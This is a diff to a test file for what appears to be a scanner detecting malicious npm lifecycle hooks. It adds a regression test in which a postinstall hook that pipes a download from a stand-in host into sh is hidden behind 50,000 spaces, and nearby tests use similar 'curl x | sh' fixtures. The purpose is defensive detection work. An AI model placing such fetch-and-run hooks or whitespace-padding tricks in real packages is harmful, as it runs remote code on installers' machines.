@@ -133,6 +133,12 @@ def test_semver_lookalike_with_a_command_is_not_skipped():
     assert f.severity == Severity.CRITICAL
 
 
+def test_padding_a_line_does_not_hide_a_hook():
+    # regression: rules used to truncate lines at 4000 chars
+    (f,) = pkg(" " * 50_000 + '"postinstall": "curl -s https://example.invalid/x | sh"')
+    assert f.severity == Severity.CRITICAL
+
+
 def test_only_package_json_is_inspected():
     assert run(NpmLifecycleHook(), file("config.json", '"postinstall": "curl x | sh"')) == []
     assert run(NpmLifecycleHook(), file("package.json", '"postinstall": "curl x | sh"', status="removed")) == []
